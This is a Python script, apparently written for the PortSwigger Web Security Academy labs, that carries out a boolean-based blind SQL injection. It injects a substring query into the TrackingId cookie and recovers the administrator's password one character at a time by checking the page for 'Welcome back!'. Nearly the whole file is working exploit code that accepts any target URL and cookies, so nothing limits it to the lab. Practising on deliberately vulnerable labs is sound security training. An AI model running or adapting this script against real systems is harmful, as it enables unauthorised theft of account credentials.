#!/usr/bin/python3
# Boolean-based blind SQL injection: extracts the administrator password one
# character at a time by checking whether the page shows "Welcome back!".
# Written for the PortSwigger Web Security Academy blind SQLi labs.
from pwn import *
import requests, signal, sys, string, time
import argparse

parser = argparse.ArgumentParser(description="this script dumps a password using conditional responses")
parser.add_argument("-u", "--url", help="url of the target server", dest="main_url", required=True)
parser.add_argument("-t", "--tracking-id", help="TrackingId cookie value", dest="tracking_id", required=True)
parser.add_argument("-s", "--session", help="session cookie value", dest="session", required=True)
parser.add_argument("-l", "--password_length", help="password length (default 20)", dest="password_length", type=int, default=20)
parser.add_argument("-m", "--match", help="text that marks a TRUE condition", dest="match", default="Welcome back!")
args = parser.parse_args()

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

characters=string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, args.password_length + 1):
        for character in characters:

            cookies = {
                'TrackingId' : "%s' and (select substring(password,%d,1) from users where username='administrator')='%s" % (args.tracking_id, position, character),
                'session' : args.session
            }

            p1.status(cookies['TrackingId'])

            r=requests.get(args.main_url, cookies=cookies)

            if args.match in r.text:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    makeRequest()
